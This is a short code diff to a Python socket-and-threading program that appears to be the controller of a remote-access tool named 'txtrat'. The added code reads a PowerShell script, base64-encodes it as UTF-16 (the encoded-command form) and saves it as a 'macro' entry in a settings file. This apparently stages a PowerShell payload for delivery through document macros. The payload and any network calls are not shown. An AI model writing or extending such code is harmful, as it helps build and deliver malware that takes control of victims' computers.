@@ -2,6 +2,8 @@ import socket
 import json
 import threading
 from optparse import OptionParser
+from os import path
+import base64
 
 import request
 import response
@@ -51,6 +53,19 @@ def main():
 
     sendFile = options.file
     execute = options.execute
+
+    # setup manage.json if the file doesn't exist.  txtrat.ps1 is needed to fill macro key
+    if not path.exists("./manage.json"):
+        with settings.lock:
+            manage = settings.initmanage
+
+            with open('./txtrat.ps1', 'r') as f:
+                data = f.read()
+
+            manage["macro"] = base64.b64encode(data.encode("utf-16")).decode()
+
+            with open('./manage.json', 'w') as f:
+                json.dump(manage, f)
 
     x = threading.Thread(target=console.newConsole, args=())
     x.start()
